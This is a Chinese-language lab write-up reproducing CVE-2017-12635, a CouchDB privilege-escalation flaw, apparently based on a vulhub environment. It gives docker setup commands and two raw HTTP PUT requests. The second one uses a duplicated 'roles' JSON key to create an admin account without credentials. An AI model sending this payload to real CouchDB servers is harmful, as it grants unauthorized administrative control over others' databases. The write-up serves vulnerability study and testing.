---
title: （CVE-2017-12635）Couchdb 垂直权限绕过漏洞
id: zhfly2856
---

# （CVE-2017-12635）Couchdb 垂直权限绕过漏洞

## 一、漏洞简介

在2017年11月15日，CVE-2017-12635和CVE-2017-12636披露，CVE-2017-12635是由于Erlang和JavaScript对JSON解析方式的不同，导致语句执行产生差异性导致的。这个漏洞可以让任意用户创建管理员，属于垂直权限绕过漏洞。

## 二、漏洞影响

小于 1.7.0 以及 小于 2.1.1

## 三、复现过程

### 环境搭建

```
docker-compose build
docker-compose up -d 
```

环境启动后，访问`http://www.0-sec.org:5984/_utils/`即可看到一个web页面，说明Couchdb已成功启动。但我们不知道密码，无法登陆。

### 漏洞复现

首先，发送如下数据包：

```
PUT /_users/org.couchdb.user:vulhub HTTP/1.1
Host: www.0-sec.org:5984
Accept: */*
Accept-Language: en
User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)
Connection: close
Content-Type: application/json
Content-Length: 90 `{

“type”: “user”,

“name”: “vulhub”,

“roles”: ["_admin"],

“password”: “vulhub”

}` 
```

可见，返回403错误：`{"error":"forbidden","reason":"Only _admin may set roles"}`，只有管理员才能设置Role角色：

![image](../img/544978315043e465623a152a9f9c80dd.png)

发送包含两个roles的数据包，即可绕过限制：

```
PUT /_users/org.couchdb.user:vulhub HTTP/1.1
Host: www.0-sec.org:5984
Accept: */*
Accept-Language: en
User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)
Connection: close
Content-Type: application/json
Content-Length: 108 `{

“type”: “user”,

“name”: “vulhub”,

“roles”: ["_admin"],

“roles”: [],

“password”: “vulhub”

}` 
```

成功创建管理员，账户密码均为`vulhub`：

![image](../img/f0aa4848a7311e290d7974a09a818c80.png)

再次访问`http://www.0-sec.org:5984/_utils/`，输入账户密码`vulhub`，可以成功登录：

![image](../img/ef6de98482ce4e71c86abc6b94fc1100.png)

## 参考链接

> https://vulhub.org/#/environments/couchdb/CVE-2017-12635/